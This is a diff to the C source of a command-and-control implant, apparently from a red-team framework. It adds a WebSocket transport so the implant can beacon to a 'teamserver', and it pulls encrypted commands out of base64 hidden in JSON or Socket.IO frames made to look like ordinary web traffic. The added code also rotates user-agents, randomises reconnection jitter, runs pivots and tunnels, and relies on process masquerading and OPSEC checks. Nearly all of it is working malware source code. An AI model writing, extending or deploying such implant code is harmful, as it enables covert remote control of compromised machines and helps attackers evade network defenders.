@@ -3,6 +3,7 @@
 #include "msgpack.h"
 #include "crypt.h"
 #include "connector.h"
+#include "ws_connector.h"
 #include "agent_info.h"
 #include "commander.h"
 #include "jobs.h"
@@ -25,6 +26,101 @@ static int ACTIVE = 1;
 /// Stored argv for process masquerading (set by entry point)
 char **g_argv = NULL;
 
+static int is_b64_char(uint8_t c) {
+    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+           (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=';
+}
+
+static int is_b64_data_char(uint8_t c) {
+    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+           (c >= '0' && c <= '9') || c == '+' || c == '/';
+}
+
+static int looks_like_b64_payload(const uint8_t* data, size_t len) {
+    if (!data || len < 40 || (len % 4) != 0) return 0;
+    size_t pad = 0;
+    for (size_t i = 0; i < len; i++) {
+        if (!is_b64_char(data[i])) return 0;
+        if (data[i] == '=') {
+            pad++;
+            if (pad > 2) return 0;
+        } else if (pad > 0) {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+static int find_json_b64_field(const uint8_t* data, size_t len, const char* key,
+                               uint8_t** out_start, size_t* out_len) {
+    size_t key_len = ax_strlen(key);
+    if (!data || !key || key_len == 0 || len <= key_len) return 0;
+
+    for (size_t i = 0; i + key_len < len; i++) {
+        if (ax_memcmp(data + i, key, key_len) != 0) continue;
+        size_t j = i + key_len;
+        while (j < len && (data[j] == ' ' || data[j] == '\t' || data[j] == '\r' || data[j] == '\n')) j++;
+        if (j >= len || data[j] != ':') continue;
+        j++;
+        while (j < len && (data[j] == ' ' || data[j] == '\t' || data[j] == '\r' || data[j] == '\n')) j++;
+        if (j >= len || data[j] != '"') continue;
+        j++;
+        size_t start = j;
+        while (j < len && data[j] != '"') j++;
+        if (j == start) {
+            *out_start = (uint8_t*)0;
+            *out_len = 0;
+            return 1;
+        }
+        if (looks_like_b64_payload(data + start, j - start)) {
+            *out_start = (uint8_t*)(data + start);
+            *out_len = j - start;
+            return 1;
+        }
+    }
+    return 0;
+}
+
+static void extract_b64_payload(uint8_t* recv_data, size_t recv_len, int ans_pre_size, int ans_size,
+                                uint8_t** b64_start, size_t* b64_len) {
+    *b64_start = recv_data;
+    *b64_len = recv_len;
+
+    if (!recv_data || recv_len == 0) return;
+
+    // Exact/legacy profile offsets still win when configured.
+    if (ans_pre_size > 0 && (int)recv_len > ans_pre_size + ans_size) {
+        *b64_start = recv_data + ans_pre_size;
+        *b64_len = recv_len - ans_pre_size - ans_size;
+        if (looks_like_b64_payload(*b64_start, *b64_len)) return;
+    }
+
+    // Business JSON wrappers: {"payload":"..."}, {"data":"..."}, etc.
+    if (find_json_b64_field(recv_data, recv_len, "\"payload\"", b64_start, b64_len)) return;
+    if (find_json_b64_field(recv_data, recv_len, "\"data\"", b64_start, b64_len)) return;
+    if (find_json_b64_field(recv_data, recv_len, "\"body\"", b64_start, b64_len)) return;
+    if (find_json_b64_field(recv_data, recv_len, "\"message\"", b64_start, b64_len)) return;
+
+    // Fallback: longest base64-looking run inside Socket.IO/custom text frames.
+    size_t best_start = 0, best_len = 0;
+    size_t i = 0;
+    while (i < recv_len) {
+        while (i < recv_len && !is_b64_data_char(recv_data[i])) i++;
+        size_t start = i;
+        while (i < recv_len && is_b64_char(recv_data[i])) i++;
+        size_t run_len = i - start;
+        while (run_len > 0 && (run_len % 4) != 0) run_len--;
+        if (run_len > best_len && looks_like_b64_payload(recv_data + start, run_len)) {
+            best_start = start;
+            best_len = run_len;
+        }
+    }
+    if (best_len > 0) {
+        *b64_start = recv_data + best_start;
+        *b64_len = best_len;
+    }
+}
+
 /// Decode an encrypted profile blob
 /// Input: [key 16B][AES-128-GCM encrypted msgpack(Profile)]
 typedef struct {
@@ -38,6 +134,13 @@ typedef struct {
     int       use_ssl;
     uint8_t   enc_key[16];
     uint16_t  bind_port;
+    // WebSocket-specific fields
+    char**    uris;
+    uint32_t  uri_count;
+    char**    ua_list;
+    uint32_t  ua_count;
+    int       ans_size;
+    int       ans_pre_size;
 } profile_t;
 
 static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t* prof) {
@@ -71,6 +174,12 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
     prof->conn_count = 1000000000;
     prof->use_ssl = 0;
     prof->bind_port = 0;
+    prof->uris = (char**)0;
+    prof->uri_count = 0;
+    prof->ua_list = (char**)0;
+    prof->ua_count = 0;
+    prof->ans_size = 0;
+    prof->ans_pre_size = 0;
 
     for (uint32_t i = 0; i < map_count; i++) {
         const char* key;
@@ -104,6 +213,36 @@ static int decode_profile(const uint8_t* enc_data, uint32_t enc_size, profile_t*
             bool v; mp_read_bool(&r, &v); prof->use_ssl = v ? 1 : 0;
         } else if (klen == 9 && ax_memcmp(key, "bind_port", 9) == 0) {
             uint64_t v; mp_read_uint(&r, &v); prof->bind_port = (uint16_t)v;
+        } else if (klen == 4 && ax_memcmp(key, "uris", 4) == 0) {
+            uint32_t arr_count;
+            if (mp_read_array(&r, &arr_count) == 0) {
+                prof->uris = (char**)ax_malloc(arr_count * sizeof(char*));
+                prof->uri_count = arr_count;
+                for (uint32_t j = 0; j < arr_count; j++) {
+                    const char* u; uint32_t ulen;
+                    mp_read_str(&r, &u, &ulen);
+                    prof->uris[j] = (char*)ax_malloc(ulen + 1);
+                    ax_memcpy(prof->uris[j], u, ulen);
+                    prof->uris[j][ulen] = '\0';
+                }
+            }
+        } else if (klen == 7 && ax_memcmp(key, "ua_list", 7) == 0) {
+            uint32_t arr_count;
+            if (mp_read_array(&r, &arr_count) == 0) {
+                prof->ua_list = (char**)ax_malloc(arr_count * sizeof(char*));
+                prof->ua_count = arr_count;
+                for (uint32_t j = 0; j < arr_count; j++) {
+                    const char* ua; uint32_t ualen;
+                    mp_read_str(&r, &ua, &ualen);
+                    prof->ua_list[j] = (char*)ax_malloc(ualen + 1);
+                    ax_memcpy(prof->ua_list[j], ua, ualen);
+                    prof->ua_list[j][ualen] = '\0';
+                }
+            }
+        } else if (klen == 8 && ax_memcmp(key, "ans_size", 8) == 0) {
+            uint64_t v; mp_read_uint(&r, &v); prof->ans_size = (int)v;
+        } else if (klen == 11 && ax_memcmp(key, "ans_pre_size", 11) == 0) {
+            uint64_t v; mp_read_uint(&r, &v); prof->ans_pre_size = (int)v;
         } else {
             mp_skip(&r);
         }
@@ -120,6 +259,20 @@ static void free_profile(profile_t* prof) {
                 ax_free(prof->addresses[i]);
         }
         ax_free(prof->addresses);
+    }
+    if (prof->uris) {
+        for (uint32_t i = 0; i < prof->uri_count; i++) {
+            if (prof->uris[i])
+                ax_free(prof->uris[i]);
+        }
+        ax_free(prof->uris);
+    }
+    if (prof->ua_list) {
+        for (uint32_t i = 0; i < prof->ua_count; i++) {
+            if (prof->ua_list[i])
+                ax_free(prof->ua_list[i]);
+        }
+        ax_free(prof->ua_list);
     }
 }
 
@@ -468,6 +621,161 @@ static int command_loop(connector_t* conn, const uint8_t* session_key, size_t se
     return 0;
 }
 
+/// WebSocket command loop — send/receive via WS frames
+/// Uses ans_pre_size/ans_size from profile to strip WebPageOutput template.
+/// Returns 0 if ACTIVE was set to 0 (exit), -1 on connection error.
+static int ws_command_loop(ws_connector_t* ws, const uint8_t* session_key, size_t session_key_len,
+                           int ans_pre_size, int ans_size) {
+    while (ACTIVE) {
+        uint8_t* recv_data = (uint8_t*)0;
+        size_t recv_len = 0;
+
+        // Poll WS with 100ms timeout
+        int poll_ret = ws_recv_message_timeout(ws, &recv_data, &recv_len, 100);
+        if (poll_ret < 0) return -1;  // error/disconnected → reconnect
+
+        // Build response objects collector
+        mp_writer_t obj_collector;
+        mp_writer_init(&obj_collector, 1024);
+        uint32_t resp_count = 0;
+
+        uint8_t* plaintext = (uint8_t*)0;
+        const uint8_t** objects = (const uint8_t**)0;
+        uint32_t* obj_sizes = (uint32_t*)0;
+        uint32_t obj_count = 0;
+        int8_t ws_msg_type = 0;
+
+        if (poll_ret == 0 && recv_data && recv_len > 0) {
+            // Extract base64 payload from plain, fixed-template, JSON, or Socket.IO wrappers.
+            uint8_t* b64_start = recv_data;
+            size_t b64_len = recv_len;
+            extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);
+
+            // Base64-decode the payload to get raw encrypted bytes
+            if (b64_len > 0) {
+                // Calculate max decoded size
+                size_t dec_max = (b64_len * 3) / 4 + 1;
+                uint8_t* decoded = (uint8_t*)ax_malloc(dec_max);
+                if (decoded) {
+                    int dec_len = ws_b64_decode((const char*)b64_start, b64_len, decoded, dec_max);
+                    if (dec_len > 0) {
+                        // Now try to decrypt the decoded binary data
+                        size_t plain_len;
+                        uint8_t* possible_plain = (uint8_t*)0;
+
+                        if (session_key_len >= 32)
+                            possible_plain = gopher_decrypt(decoded, (size_t)dec_len,
+                                                             session_key, session_key_len, &plain_len);
+                        else
+                            possible_plain = aes128_gcm_decrypt(decoded, (size_t)dec_len,
+                                                                session_key, &plain_len);
+
+                        if (possible_plain) {
+                            plaintext = possible_plain;
+                            // Parse Message
+                            if (parse_message(plaintext, plain_len, &ws_msg_type, &objects, &obj_sizes, &obj_count) != 0) {
+                                ax_free(plaintext);
+                                plaintext = (uint8_t*)0;
+                            }
+                        }
+                    }
+                    ax_free(decoded);
+                }
+            }
+
+            ax_free(recv_data);
+            recv_data = (uint8_t*)0;
+
+            if (ws_msg_type == 1 && obj_count > 0) {
+                for (uint32_t i = 0; i < obj_count; i++) {
+                    uint32_t code = 0, cmd_id = 0;
+                    const uint8_t* cmd_data = (const uint8_t*)0;
+                    uint32_t cmd_data_len = 0;
+                    parse_command(objects[i], obj_sizes[i],
+                                 &code, &cmd_id, &cmd_data, &cmd_data_len);
+
+                    mp_writer_t cmd_resp;
+                    mp_writer_init(&cmd_resp, 256);
+
+                    int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
+                    if (ret == -99) ACTIVE = 0;
+
+                    // Wrap response in Command{code, id, data}
+                    mp_writer_t wrapped;
+                    mp_writer_init(&wrapped, 256);
+                    mp_write_map(&wrapped, 3);
+                    mp_write_kv_uint(&wrapped, "code", code);
+                    mp_write_kv_uint(&wrapped, "id", cmd_id);
+                    mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);
+
+                    mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
+                    mp_writer_free(&cmd_resp);
+                    mp_writer_free(&wrapped);
+                    resp_count++;
+                }
+            }
+        } else if (poll_ret == 0 && recv_len == 0) {
+            // Received empty heartbeat from teamserver
+            if (recv_data) ax_free(recv_data);
+            recv_data = (uint8_t*)0;
+        }
+
+        // ALWAYS poll active pivots and tunnels
+        resp_count += (uint32_t)process_pivots(&g_pivot_ctx, &obj_collector);
+        resp_count += (uint32_t)process_tunnels(&obj_collector);
+
+        // Send response if we have data OR if we received a message
+        int must_respond = (poll_ret == 0);
+        if (resp_count > 0 || must_respond) {
+            mp_writer_t msg_writer;
+            mp_writer_init(&msg_writer, 1024);
+            mp_write_map(&msg_writer, 2);
+
+            if (resp_count > 0) {
+                mp_write_kv_int(&msg_writer, "type", 1);
+                mp_write_str(&msg_writer, "object", 6);
+                mp_write_array(&msg_writer, resp_count);
+                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
+            } else {
+                mp_write_kv_int(&msg_writer, "type", 0);
+                mp_write_str(&msg_writer, "object", 6);
+                mp_write_array(&msg_writer, 0);
+            }
+
+            size_t enc_len;
+            uint8_t* encrypted;
+            if (session_key_len >= 32)
+                encrypted = gopher_encrypt(msg_writer.buf.data, msg_writer.buf.len,
+                                           session_key, session_key_len, &enc_len);
+            else
+                encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
+                                                session_key, &enc_len);
+            mp_writer_free(&msg_writer);
+
+            if (encrypted) {
+                // Send encrypted data as WebSocket text frame
+                if (ws_send_text(ws, encrypted, enc_len) != 0) {
+                    ax_free(encrypted);
+                    mp_writer_free(&obj_collector);
+                    if (objects) ax_free((void*)objects);
+                    if (obj_sizes) ax_free(obj_sizes);
+                    if (plaintext) ax_free(plaintext);
+                    return -1;
+                }
+                ax_free(encrypted);
+            }
+        }
+        mp_writer_free(&obj_collector);
+
+        // Cleanup
+        if (objects) ax_free((void*)objects);
+        if (obj_sizes) ax_free(obj_sizes);
+        if (plaintext) ax_free(plaintext);
+        if (recv_data) ax_free(recv_data);
+    }
+    return 0;
+}
+
 static int agent_main(void) {
     // OPSEC checks — abort if hostile environment detected
 #ifdef OPSEC_ENABLED
@@ -493,8 +801,9 @@ static int agent_main(void) {
 
     if (profile_count == 0) return 1;
 
-    // Detect protocol: watermark==0 → GopherTCP, else LinuxTCP
-    int is_gopher = (profiles[0].listener_watermark == 0) ? 1 : 0;
+    // Detect protocol: watermark==0 → GopherTCP, uri_count>0 → WebSocket, else LinuxTCP
+    int is_gopher = (profiles[0].listener_watermark == 0 && profiles[0].uri_count == 0) ? 1 : 0;
+    int is_ws = (profiles[0].uri_count > 0 && profiles[0].ua_count > 0) ? 1 : 0;
 
     // Create session info (GopherTCP: 32-byte key+salt, LinuxTCP: 16-byte key)
     mp_writer_t si_writer;
@@ -548,7 +857,108 @@ static int agent_main(void) {
 
     if (!init_msg) { ax_free(session_info_data); return 1; }
 
-    if (prof->bind_port > 0) {
+    if (is_ws) {
+        // ======== WEBSOCKET MODE ========
+        // Agent connects to WS teamserver via WebSocket upgrade
+        uint32_t addr_idx = 0;
+        uint32_t uri_idx = 0;
+        uint32_t ua_idx = 0;
+
+        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
+            if (attempt > 0) {
+                // Bidirectional jitter: ±20% of conn_timeout
+                unsigned int base_sleep = (unsigned int)prof->conn_timeout;
+                if (base_sleep > 2) {
+                    uint8_t rnd[4];
+                    ax_random_bytes(rnd, 4);
+                    uint32_t rval = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16) |
+                                    ((uint32_t)rnd[2] << 8)  | rnd[3];
+                    unsigned int jitter_range = (base_sleep * 40) / 100;
+                    unsigned int delta = rval % (jitter_range + 1);
+                    unsigned int half = jitter_range / 2;
+                    if (base_sleep > half)
+                        base_sleep = base_sleep - half + delta;
+                }
+                sys_sleep(base_sleep);
+                addr_idx = (addr_idx + 1) % prof->addr_count;
+                if (addr_idx == 0) {
+                    uri_idx = (uri_idx + 1) % prof->uri_count;
+                    ua_idx = (ua_idx + 1) % prof->ua_count;
+                    prof_idx = (prof_idx + 1) % profile_count;
+                    prof = &profiles[prof_idx];
+
+                    ax_free(init_msg);
+                    build_init_msg(agent_id, prof->type,
+                                   prof->listener_watermark,
+                                   session_info_data, session_info_len,
+                                   prof->enc_key,
+                                   &init_msg, &init_msg_len);
+                }
+            }
+
+            // Build the beat (RC4-encrypted with profile enc_key, then b64) for Sec-WebSocket-Protocol
+            uint8_t ws_beat_buf[512];
+            size_t ws_beat_len = 0;
+            // The beat carries agent type watermark and agent id for server-side agent creation
+            if (ws_build_beat(prof->enc_key, prof->type, agent_id,
+                              session_info_data, session_info_len,
+                              ws_beat_buf, sizeof(ws_beat_buf), &ws_beat_len) != 0) {
+                continue;
+            }
+            ws_beat_buf[ws_beat_len] = '\0';
+
+            // WS connect uses the first uri and first UA from the profile
+            const char* current_uri = prof->uris[uri_idx % prof->uri_count];
+            const char* current_ua = prof->ua_list[ua_idx % prof->ua_count];
+
+            // Convert port from network byte order to host byte order for display
+            uint16_t host_port = 443;  // default SSL port
+            for (uint32_t pi = 0; pi < prof->addr_count; pi++) {
+                // Parse the address string for the port
+                const char* addr = prof->addresses[addr_idx];
+                const char* colon = (const char*)0;
+                for (const char* p = addr; *p; p++) {
+                    if (*p == ':') colon = p;
+                }
+                if (colon) {
+                    host_port = 0;
+                    for (const char* p = colon + 1; *p >= '0' && *p <= '9'; p++)
+                        host_port = host_port * 10 + (*p - '0');
+                }
+            }
+
+            // Extract hostname from address string (strip port)
+            char host_buf[256];
+            const char* addr_str = prof->addresses[addr_idx];
+            int host_i = 0;
+            for (const char* p = addr_str; *p && *p != ':' && host_i < 255; p++)
+                host_buf[host_i++] = *p;
+            host_buf[host_i] = '\0';
+
+            ws_connector_t ws;
+            ws_init(&ws);
+
+            if (ws_connect(&ws, host_buf, host_port, current_uri, current_ua,
+                          (const char*)ws_beat_buf, prof->use_ssl) != 0) {
+                continue;
+            }
+
+            // Reset attempt counter on successful connect
+            attempt = 0;
+
+            // Send init message as first WS text frame
+            if (ws_send_text(&ws, init_msg, init_msg_len) != 0) {
+                ws_disconnect(&ws);
+                continue;
+            }
+
+            // Enter WS command loop with template stripping
+            ws_command_loop(&ws, session_key, session_key_len,
+                           prof->ans_pre_size, prof->ans_size);
+
+            ws_disconnect(&ws);
+        }
+    } else if (prof->bind_port > 0) {
         // ======== BIND TCP MODE ========
         // Agent listens on a port, parent connects to us.
         // Used for pivot: beacon parent → "link tcp <ip> <port>" → this agent.
